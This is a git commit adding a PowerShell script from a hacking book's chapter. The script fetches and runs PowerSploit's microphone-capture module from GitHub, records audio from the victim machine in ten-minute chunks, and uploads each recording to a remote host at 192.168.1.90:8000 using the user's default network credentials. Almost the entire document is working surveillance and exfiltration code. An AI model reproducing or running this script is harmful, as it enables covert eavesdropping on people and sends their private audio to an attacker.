2d3fa7405394667aa06a81c1240327425d1be3ed
Hack like a Pornstar <hacklikeapornstar@protonmail.com>
2017-04-18 14:45:12 +0200

    Create record.ps1

---
+++ chapter5/record.ps1
@@ -0,0 +1,18 @@
+#
+# Creates 10 minute long audio files and sends them to a remote location (192.168.1.90:8000 in this example)
+#
+# @uthor : Sparc Flow in "How to Hack a Fashion Brand"
+import-module .\Get-MicrophoneAudio.ps1 -force
+while($i -le 2)
+{
+
+$i++;
+$browser = New-Object System.Net.WebClient
+$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;
+IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1"));
+write-host "starting recording $i"
+Get-MicrophoneAudio -path .\file$i.wav -Length 10
+write-host "sending job $i"
+start-job -Name Para$i -ArgumentList $i -ScriptBlock{ $i = $args[0];$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; $browser.uploadFile("http://192.168.1.90:8000/", "c:\users\ejansen\appdata\local\file$i.wav");}
+
+}
